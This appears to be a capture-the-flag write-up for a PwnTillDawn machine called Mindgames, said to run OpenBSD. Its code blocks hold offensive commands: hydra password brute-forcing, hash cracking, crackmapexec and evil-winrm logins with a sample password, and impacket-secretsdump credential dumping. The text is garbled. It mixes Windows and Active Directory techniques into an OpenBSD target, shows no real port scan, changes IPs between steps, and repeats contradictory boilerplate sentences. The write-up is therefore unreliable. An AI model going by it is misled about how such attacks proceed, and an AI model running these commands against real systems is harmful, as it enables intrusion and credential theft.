---
TitleSEO: "PwnTillDawn — Mindgames (Medium OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Mindgames (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Mindgames. AlwaysInstallElevated and DNS Rebinding to achieve medium compromise on OpenBSD."
Keywords: "pwntilldawn, ctf, forensics"
URL: "https://zurefx.github.io/writeups/htb-mindgames-922.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-922/"
Date: "2025-04-20"
Tags: "PwnTillDawn, CTF, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-922"
Permalink: "/writeups/htb-mindgames-922.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mindgames** is rated **Medium** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.33.82.33`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
feroxbuster -h
feroxbuster -h
```

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.50.182.3 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.108.27 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.24.104.125 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **DNS Rebinding**.

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.128.216/FUZZ
gobuster dir -u http://10.85.43.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.181.84 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
evil-winrm -i 10.81.227.104 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.99.43.93 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.187.132
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `rubeus`
- `feroxbuster`
- `enum4linux`
- `ffuf`
- `nmap`

### Key Takeaways

- AlwaysInstallElevated
- DNS Rebinding
- SeDebugPrivilege
- SeImpersonatePrivilege
